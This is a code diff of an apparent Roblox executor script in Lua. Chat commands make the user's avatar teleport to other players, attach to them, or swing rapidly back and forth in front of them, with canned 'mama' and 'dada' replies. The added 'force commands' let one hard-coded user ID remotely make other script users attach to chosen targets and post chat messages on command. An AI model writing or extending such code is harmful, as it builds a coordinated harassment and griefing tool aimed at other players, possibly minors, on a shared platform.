@@ -131,20 +131,33 @@ local TELEPORT_COOLDOWN = 1
 local CHAT_COOLDOWN = 3
 
 -- User IDs and their custom replies
-local MOMMY_USER_ID = 8147002194        -- types .f/.i -> "yes mama?" (only if responder is 1733619112)
-local RESPONDER_USER_ID = 1733619112    -- the only user whose script replies "yes mama?" AND the only user who can use .c
-local DADA_USER_ID = 8051317045         -- types .f -> "im here dada"; types .i -> "geeg"
+local MOMMY_USER_ID = 8147002194
+local RESPONDER_USER_ID = 1733619112
+local DADA_USER_ID = 8051317045
 
--- .h offset: at root level (waist), 2 studs forward (back to them)
+-- .h offset: root level (waist), 2 studs forward (back to them)
 local HOLD_OFFSET = CFrame.new(0, 0, -2)
 
 -- .y config: fast back-and-forth straight in front of the holder.
-local Y_BASE_Z = -1.5      -- centered 1.5 studs in front
-local Y_AMPLITUDE = 0.6    -- swing ±0.6 studs (tight)
-local Y_SPEED = 20         -- rad/sec (higher = faster)
+local Y_BASE_Z = -1.5
+local Y_AMPLITUDE = 0.6
+local Y_SPEED = 20
 
 local lastTeleport = 0
 local lastChat = 0
+
+-- ============================================================
+-- SEND HELPERS (only for real chat messages, not hidden broadcasts)
+-- ============================================================
+
+local function sendRaw(text)
+	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+		local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+		if channel then
+			pcall(function() channel:SendAsync(text) end)
+		end
+	end
+end
 
 local function sendChatMessage(text, force)
 	local now = tick()
@@ -152,16 +165,12 @@ local function sendChatMessage(text, force)
 		return
 	end
 	lastChat = now
-
-	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-		local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-		if channel then
-			pcall(function()
-				channel:SendAsync(text)
-			end)
-		end
-	end
+	sendRaw(text)
 end
+
+-- ============================================================
+-- NAME HELPERS
+-- ============================================================
 
 local function getRootPart(player)
 	local character = player.Character
@@ -171,42 +180,39 @@ local function getRootPart(player)
 	return character:WaitForChild("HumanoidRootPart")
 end
 
--- Shared name resolver: exact username, then prefix on Name OR DisplayName.
 local function findPlayerByName(name)
 	if not name or name == "" then return nil end
 	name = name:gsub("^@", ""):gsub("%s+$", "")
 	if name == "" then return nil end
 
-	-- Exact username
 	local target = Players:FindFirstChild(name)
 	if target then return target end
 
 	local lower = name:lower()
 	local len = #lower
 
-	-- Prefix match on Name, then prefix match on DisplayName, then exact DisplayName
 	for _, p in ipairs(Players:GetPlayers()) do
-		if p.Name:lower():sub(1, len) == lower then
-			return p
-		end
+		if p.Name:lower():sub(1, len) == lower then return p end
 	end
-
 	for _, p in ipairs(Players:GetPlayers()) do
-		if p.DisplayName:lower():sub(1, len) == lower then
-			return p
-		end
+		if p.DisplayName:lower():sub(1, len) == lower then return p end
 	end
-
 	for _, p in ipairs(Players:GetPlayers()) do
-		if p.DisplayName:lower() == lower then
-			return p
-		end
+		if p.DisplayName:lower() == lower then return p end
 	end
-
 	return nil
 end
 
--- ===== EMOTE =====
+local function isLocalPlayerByName(name)
+	if not name or name == "" then return false end
+	local lower = name:lower()
+	return localPlayer.Name:lower() == lower or localPlayer.DisplayName:lower() == lower
+end
+
+-- ============================================================
+-- EMOTE
+-- ============================================================
+
 local function playEmoteOn(humanoid)
 	if not humanoid then return nil end
 	if humanoid.RigType == Enum.HumanoidRigType.R6 then return nil end
@@ -299,15 +305,12 @@ local function restoreMovement(humanoid)
 	savedUseJumpPower = nil
 end
 
--- ===== .f : tp in front, face each other, emote once, optional chat =====
-local function teleportTo(targetPlayer, customMessage)
-	if targetPlayer == localPlayer then return end
+-- ============================================================
+-- CORE ACTIONS
+-- ============================================================
 
-	local now = tick()
-	if now - lastTeleport < TELEPORT_COOLDOWN then
-		return
-	end
-	lastTeleport = now
+local function doFOn(targetPlayer)
+	if not targetPlayer or targetPlayer == localPlayer then return end
 
 	local myCharacter = localPlayer.Character
 	if not myCharacter then return end
@@ -335,23 +338,28 @@ local function teleportTo(targetPlayer, customMessage)
 	end
 
 	task.wait(0.15)
-
 	playEmote()
+end
+
+local function teleportTo(targetPlayer, customMessage)
+	if targetPlayer == localPlayer then return end
+	local now = tick()
+	if now - lastTeleport < TELEPORT_COOLDOWN then return end
+	lastTeleport = now
+
+	doFOn(targetPlayer)
 
 	if customMessage then
 		sendChatMessage(customMessage, false)
 	end
 end
 
--- ===== .to <player> : tp in front, no emote, no chat =====
 local function teleportToByName(name)
 	local target = findPlayerByName(name)
 	if not target or target == localPlayer then return end
 
 	local now = tick()
-	if now - lastTeleport < TELEPORT_COOLDOWN then
-		return
-	end
+	if now - lastTeleport < TELEPORT_COOLDOWN then return end
 	lastTeleport = now
 
 	local myCharacter = localPlayer.Character
@@ -366,7 +374,6 @@ local function teleportToByName(name)
 	myCharacter:PivotTo(faceCFrame)
 end
 
--- ===== .h / .y =====
 local function stopHold()
 	if holdTarget == nil then return end
 	holdTarget = nil
@@ -386,7 +393,6 @@ local function stopHold()
 	end
 end
 
--- Full reset: stop hold AND reset local player state (movement + animations)
 local function resetSelf()
 	stopHold()
 
@@ -515,21 +521,82 @@ local connection = TextChatService.MessageReceived:Connect(function(message)
 	local senderId = sender.UserId
 	if not senderId then return end
 
-	local text = message.Text:lower()
 	local rawText = message.Text
+	local lower = rawText:lower()
 
-	-- .c <message> : ONLY UserId 1733619112 can trigger this.
-	-- Every OTHER script user in the game types <message> in chat.
+	-- ==========================================================
+	-- FORCE COMMANDS (only from RESPONDER_USER_ID)
+	-- Syntax: ".command <scriptUser> [<target>]"
+	-- Only the script user whose name matches <scriptUser> acts.
+	-- No hidden broadcast is sent -- this message IS the command.
+	-- ==========================================================
+	if senderId == RESPONDER_USER_ID then
+		-- .y <executor> <target>
+		local yExec, yTgt = rawText:match("^[.]y%s+(%S+)%s+(.+)$")
+		if yExec and yTgt then
+			if isLocalPlayerByName(yExec) then
+				local target = findPlayerByName(yTgt)
+				if target and target ~= localPlayer then
+					startHold(target, "y")
+				end
+			end
+			return
+		end
+
+		-- .h <executor> <target>
+		local hExec, hTgt = rawText:match("^[.]h%s+(%S+)%s+(.+)$")
+		if hExec and hTgt then
+			if isLocalPlayerByName(hExec) then
+				local target = findPlayerByName(hTgt)
+				if target and target ~= localPlayer then
+					startHold(target, "h")
+				end
+			end
+			return
+		end
+
+		-- .to <executor> <target>
+		local toExec, toTgt = rawText:match("^[.]to%s+(%S+)%s+(.+)$")
+		if toExec and toTgt then
+			if isLocalPlayerByName(toExec) then
+				teleportToByName(toTgt)
+			end
+			return
+		end
+
+		-- .re <executor>
+		local reExec = rawText:match("^[.]re%s+(%S+)$")
+		if reExec then
+			if isLocalPlayerByName(reExec) then
+				resetSelf()
+			end
+			return
+		end
+
+		-- .f <executor>  -> executor .f's the responder
+		local fExec = rawText:match("^[.]f%s+(%S+)$")
+		if fExec then
+			if isLocalPlayerByName(fExec) then
+				local senderPlayer = Players:GetPlayerByUserId(senderId)
+				if senderPlayer and senderPlayer ~= localPlayer then
+					doFOn(senderPlayer)
+				end
+			end
+			return
+		end
+	end
+
+	-- ===== .c <message> from RESPONDER =====
 	if senderId == RESPONDER_USER_ID and senderId ~= localPlayer.UserId then
-		local cMessage = rawText:match("^[.]c%s+(.+)$")
+		local cMessage = rawText:match("^[.][cC]%s+(.+)$")
 		if cMessage and cMessage ~= "" then
 			sendChatMessage(cMessage, true)
 			return
 		end
 	end
 
-	-- .i : respond with the right message based on sender
-	if text == ".i" then
+	-- ===== .i handlers =====
+	if lower == ".i" then
 		if senderId == MOMMY_USER_ID and localPlayer.UserId == RESPONDER_USER_ID then
 			sendChatMessage("yes mama?", true)
 		elseif senderId == DADA_USER_ID then
@@ -538,8 +605,8 @@ local connection = TextChatService.MessageReceived:Connect(function(message)
 		return
 	end
 
-	-- .re from someone else: if they're the one we're attached to, release.
-	if text == ".re" and senderId ~= localPlayer.UserId then
+	-- ===== .re from someone else =====
+	if lower == ".re" and senderId ~= localPlayer.UserId then
 		if holdTarget ~= nil then
 			local theirPlayer = Players:GetPlayerByUserId(senderId)
 			if theirPlayer and theirPlayer == holdTarget then
@@ -549,50 +616,52 @@ local connection = TextChatService.MessageReceived:Connect(function(message)
 		return
 	end
 
-	-- Self commands
+	-- ===== Self commands =====
 	if senderId == localPlayer.UserId then
-		if text == ".disable" then
+		if lower == ".disable" then
 			env.__fScriptEnabled = false
-		elseif text == ".enable" then
+			return
+		elseif lower == ".enable" then
 			env.__fScriptEnabled = true
-		elseif text == ".re" then
+			return
+		elseif lower == ".re" then
 			resetSelf()
-		elseif text == ".h" or text == ".y" then
+			return
+		elseif lower == ".h" or lower == ".y" then
 			stopHold()
-		else
-			-- .to <player>
-			local toName = rawText:match("^[.]to%s+(.+)$")
-			if toName then
-				teleportToByName(toName)
-			else
-				-- .h <player>
-				local hName = rawText:match("^[.]h%s+(.+)$")
-				if hName then
-					local target = findPlayerByName(hName)
-					if target then
-						startHold(target, "h")
-					end
-				else
-					-- .y <player>
-					local yName = rawText:match("^[.]y%s+(.+)$")
-					if yName then
-						local target = findPlayerByName(yName)
-						if target then
-							startHold(target, "y")
-						end
-					end
-				end
-			end
+			return
 		end
+
+		local toName = rawText:match("^[.]to%s+(.+)$")
+		if toName then
+			teleportToByName(toName)
+			return
+		end
+
+		local hName = rawText:match("^[.]h%s+(.+)$")
+		if hName then
+			local target = findPlayerByName(hName)
+			if target then startHold(target, "h") end
+			return
+		end
+
+		local yName = rawText:match("^[.]y%s+(.+)$")
+		if yName then
+			local target = findPlayerByName(yName)
+			if target then startHold(target, "y") end
+			return
+		end
+
 		return
 	end
 
+	-- ===== Normal other-player commands =====
 	if not env.__fScriptEnabled then return end
 
 	local targetPlayer = Players:GetPlayerByUserId(senderId)
 	if not targetPlayer then return end
 
-	if text == ".f" then
+	if lower == ".f" then
 		local reply = nil
 		if senderId == MOMMY_USER_ID and localPlayer.UserId == RESPONDER_USER_ID then
 			reply = "yes mama?"
@@ -600,13 +669,13 @@ local connection = TextChatService.MessageReceived:Connect(function(message)
 			reply = "im here dada"
 		end
 		teleportTo(targetPlayer, reply)
-	elseif text == ".h" then
+	elseif lower == ".h" then
 		if holdTarget ~= nil and targetPlayer == holdTarget then
 			stopHold()
 		else
 			startHold(targetPlayer, "h")
 		end
-	elseif text == ".y" then
+	elseif lower == ".y" then
 		if holdTarget ~= nil and targetPlayer == holdTarget then
 			stopHold()
 		else
